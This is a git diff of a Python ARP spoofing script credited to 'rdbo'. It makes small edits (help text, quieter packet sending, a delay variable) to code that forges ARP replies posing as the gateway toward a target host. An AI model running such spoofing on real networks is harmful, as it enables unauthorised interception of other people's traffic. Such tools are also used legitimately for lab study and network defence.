@@ -6,14 +6,14 @@ def usage():
     print("sudo python3 arp_spoofer.py <arguments>")
     print("-t (--target):              specify target's local ip address")
     print("-m (--mac):                 attacker's mac address")
-    print("-g (--gateway):             gateway's ip address")
+    print("-g (--gateway):             gateway's ip address (for IP forwarding)")
     print("-b (--broadcast)[optional]: network broadcast")
     print("-i (--interval)[optinal]:   interval between packets")
     print("-c (--count)[optional]:     ammount of packets to send (default 100)")
 
 def send_packet(packet, interval : float, pcount : int):
     try:
-        send(packet, inter=interval, count=pcount)
+        send(packet, inter=interval, count=pcount, verbose=False)
     except KeyboardInterrupt:
         print()
         print("[!] Interrupted, exiting...")
@@ -23,8 +23,9 @@ def send_packet(packet, interval : float, pcount : int):
         exit(0)
 
 def arp_spoof(target : str, mac : str, gateway : str, broadcast : str, interval : float, pcount : int):
+    delay = 0.75
     print("<< arp_spoofer.py by rdbo >>")
-    time.sleep(0.75)
+    time.sleep(delay)
     packet = ARP()
     packet.psrc = gateway
     packet.pdst = target
